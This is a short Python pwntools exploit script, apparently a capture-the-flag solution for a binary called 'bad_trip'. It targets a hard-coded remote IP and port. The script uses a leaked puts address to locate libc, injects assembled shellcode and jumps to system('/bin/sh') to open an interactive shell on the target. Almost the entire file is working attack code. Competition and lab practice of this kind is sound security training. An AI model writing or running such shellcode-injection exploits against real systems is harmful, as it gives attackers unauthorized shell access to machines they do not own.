#!/usr/bin/env python3
from pwn import *
from subprocess import run

# =========================================================
#                          SETUP                         
# =========================================================
exe = './bad_trip_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
# libc = '/lib/x86_64-linux-gnu/libc.so.6'
# libc = '/usr/lib/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '172.210.129.230', 1352

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *exec+71
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================


def exploit():
    global io
    io = initialize()

    io.recvuntil(b'with ')
    puts = int(io.recvline().strip(), 16)
    libc.address = puts - libc.sym['puts']
    system_off = libc.sym['system'] - libc.address

    run("nasm -f bin shellcode.asm -o shellcode.bin", shell=True, check=True)
    shellcode = open("shellcode.bin", "rb").read()

    shellcode += asm(f'''
        or r12, {hex(libc.address)}
        lea rdi, s[rip]
        add r12, {hex(system_off)}

        mov rsp, r13
        mov rbp, r13

        jmp r12

        s:
            .string "/bin/sh"
    ''')
    io.sendlineafter(b'>>', shellcode)

    log.success('puts: %#x', puts)
    log.success('libc: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()